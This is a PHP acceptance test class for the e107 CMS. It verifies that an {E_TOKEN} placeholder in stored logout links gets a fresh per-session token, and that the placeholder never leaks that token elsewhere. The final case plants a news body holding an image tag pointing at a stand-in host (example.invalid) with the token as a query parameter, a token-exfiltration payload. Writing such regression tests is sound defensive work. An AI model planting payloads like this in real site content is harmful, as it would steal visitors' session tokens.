<?php

/**
 * A logout link that core does not render in PHP has been refused since v2.3.12,
 * and a URL saved in Admin Area » Settings » Navigation is exactly that. {E_TOKEN}
 * is the opt-in that gives it back: the administrator writes
 * index.php?logout&e-token={E_TOKEN}, and every renderer of a stored link URL
 * fills it per request.
 *
 * Only those renderers fill it. e107 renders member-written strings in contexts
 * that do parse shortcodes, so a placeholder honoured everywhere shortcodes expand
 * would hand a visitor's live token to whatever a member put an image tag around;
 * the last case here is that payload, and it must never come back with a token in
 * it.
 *
 * The acceptance database is not reloaded between runs, so the one row this Cest
 * makes the application create is taken back out through admin_ui's own delete
 * trigger, whether the case that made it passed or not.
 *
 * @see sitelinks::fillToken()
 * @see class2.php  logout_refused()
 */
class TokenPlaceholderCest
{
	/** Where a bundled theme publishes {NAVIGATION=main}. */
	const FRONT_PAGE = '/index.php';

	/** A distinctive fragment of the refusal core answers a tokenless logout with. */
	const REFUSED = 'no security token';

	/** The replacement an administrator is told to write into a stored logout link. */
	const PLACEHOLDER_URL = 'index.php?logout&e-token={E_TOKEN}';

	/** What the affected sites have stored instead. */
	const PLAIN_URL = 'index.php?logout';

	/** A third-party host a member could name in an image tag. */
	const PAYLOAD_HOST = 'example.invalid';

	/** The URL that would fetch a viewer's token off the site if anything filled it. */
	const PAYLOAD_URL = 'http://example.invalid/?t={E_TOKEN}';

	/** admin_ui's create trigger for the navigation manager. */
	const CREATE_PATH = '/e107_admin/links.php?mode=main&action=create';

	/** Navigation » Manage, whose ID column is a live anchor on the stored URL. */
	const LIST_PATH = '/e107_admin/links.php?mode=main&action=list';

	/** The category {NAVIGATION=main} renders. */
	const NAV_CATEGORY = 1;

	/** The name of the one row this Cest makes the application create. */
	const FORM_PROBE = 'TokenPlaceholderFormProbe';

	/** @var bool whether this test posted the create trigger */
	private $linkCreated = false;

	public function _after(AcceptanceTester $I)
	{
		if($this->linkCreated)
		{
			$I->loginAsAdmin();
			$I->removeSitelink(self::FORM_PROBE);
			$this->linkCreated = false;
		}
	}

	/**
	 * The reported scenario, from the form the administrator types it into. The URL
	 * passes a validated field and toDB() on the way in, so what is stored is worth
	 * asserting on separately from what is rendered.
	 */
	public function aLinkTypedIntoTheAdminFormEndsTheSession(AcceptanceTester $I)
	{
		$I->loginAsAdmin();

		$fields = $this->linkRow(self::FORM_PROBE, self::PLACEHOLDER_URL);
		$fields['etrigger_submit'] = 'create';
		$fields['__after_submit_action'] = 'list';
		$fields['e-token'] = $I->grabFreshAdminToken(self::CREATE_PATH);

		$this->linkCreated = true;
		$I->sendPostRequest(self::CREATE_PATH, $fields);

		$stored = $I->grabFromDatabase('e107_links', 'link_url', array('link_name' => self::FORM_PROBE));
		$I->assertSame(self::PLACEHOLDER_URL, html_entity_decode($stored, ENT_QUOTES, 'UTF-8'),
			'the form stored something other than the URL it was given');

		$I->amOnPage(self::FRONT_PAGE);

		$I->dontSeeInSource('{E_TOKEN}');
		$link = $I->grabNavigationLogoutLink();
		$I->assertStringContainsString('e-token=', $link, 'the stored placeholder has to reach the href as a token');

		$I->amOnPage($link);

		$I->dontSeeInSource(self::REFUSED);
		$I->seeSignedOut();
	}

	/**
	 * The other half of an opt-in: a link that was never edited is still refused,
	 * so the fix cannot be read as having quietly reopened the forgery.
	 */
	public function aStoredSitelinkWithNoPlaceholderIsStillRefused(AcceptanceTester $I)
	{
		$I->haveInDatabase('e107_links', $this->linkRow('TokenPlaceholderPlainNav', self::PLAIN_URL));

		$I->loginAsAdmin();
		$I->amOnPage(self::FRONT_PAGE);

		$link = $I->grabNavigationLogoutLink();
		$I->assertStringNotContainsString('e-token=', $link);

		$I->amOnPage($link);

		$I->seeInSource(self::REFUSED);
		$I->seeStillSignedIn();
	}

	/**
	 * A stored URL is one row, so the token in the href can only come from the
	 * session being served. Both sessions are the same account on purpose: nothing
	 * about the account distinguishes them, so a second session holding the first
	 * one's token would mean the value had been retained somewhere between them.
	 */
	public function theStoredSitelinkGetsAFreshTokenForEachSession(AcceptanceTester $I)
	{
		$I->haveInDatabase('e107_links', $this->linkRow('TokenPlaceholderCachedNav', self::PLACEHOLDER_URL));

		$I->loginAsAdmin();
		$I->amOnPage(self::FRONT_PAGE);
		$first = $I->grabNavigationLogoutLink();

		$I->resetAllCookies();
		$I->loginAsAdmin();
		$I->amOnPage(self::FRONT_PAGE);
		$second = $I->grabNavigationLogoutLink();

		$I->assertNotSame($first, $second, 'the second session was served the first one\'s token');

		$I->amOnPage($second);

		$I->dontSeeInSource(self::REFUSED);
		$I->seeSignedOut();
	}

	/**
	 * The ID column is where an administrator tries the link they have just saved,
	 * and it is the one renderer of a stored URL that never parsed it.
	 */
	public function theManageListLinksToTheFilledUrl(AcceptanceTester $I)
	{
		$I->haveInDatabase('e107_links', $this->linkRow('TokenPlaceholderListNav', self::PLACEHOLDER_URL));

		$I->loginAsAdmin();
		$I->amOnPage(self::LIST_PATH);

		$I->seeInSource('index.php?logout&e-token='.$I->grabPublishedToken());
	}

	/**
	 * The reason the placeholder is filled by three named resolvers and not wherever
	 * e107 parses shortcodes. A member's submitted news body is copied verbatim into
	 * news_body on approval and rendered in the BODY context, which parses shortcodes
	 * and leaves link_click on, so an image tag around an attacker's URL is the shape
	 * that would exfiltrate every later visitor's session token on page view.
	 *
	 * The token is on the page either way, in the meta element core publishes for its
	 * own forms; what must never happen is that it reaches the third party's URL.
	 */
	public function aMemberWrittenImageTagNeverCarriesTheToken(AcceptanceTester $I)
	{
		$id = $I->haveInDatabase('e107_news', array(
			'news_title'            => 'TokenPlaceholderPayload',
			'news_sef'              => 'tokenplaceholderpayload',
			'news_body'             => '[img]'.self::PAYLOAD_URL.'[/img]',
			'news_extended'         => '',
			'news_meta_title'       => '',
			'news_meta_keywords'    => '',
			'news_meta_description' => '',
			'news_datestamp'        => 1,
			'news_author'           => 1,
			'news_category'         => 0,
			'news_allow_comments'   => 0,
			'news_sticky'           => 0,
			'news_start'            => 0,
			'news_end'              => 0,
			'news_class'            => '0',
			'news_render_type'      => '0',
			'news_summary'          => '',
			'news_thumbnail'        => '',
		));

		$I->loginAsAdmin();
		$I->amOnPage('/news.php?extend.'.$id);

		$I->seeInSource(self::PAYLOAD_HOST.'/?t=');
		$I->dontSeeInSource(self::PAYLOAD_HOST.'/?t='.$I->grabPublishedToken());
	}

	/**
	 * @param string $name
	 * @param string $url
	 * @param int $category
	 * @return array a row of the shape Navigation » Manage stores
	 */
	private function linkRow($name, $url, $category = self::NAV_CATEGORY)
	{
		return array(
			'link_name'        => $name,
			'link_url'         => $url,
			'link_description' => '',
			'link_button'      => '',
			'link_category'    => $category,
			'link_order'       => 950,
			'link_parent'      => 0,
			'link_open'        => 0,
			'link_class'       => 0,
			'link_function'    => '',
			'link_sefurl'      => '',
			'link_rel'         => '',
			'link_owner'       => '',
		);
	}
}
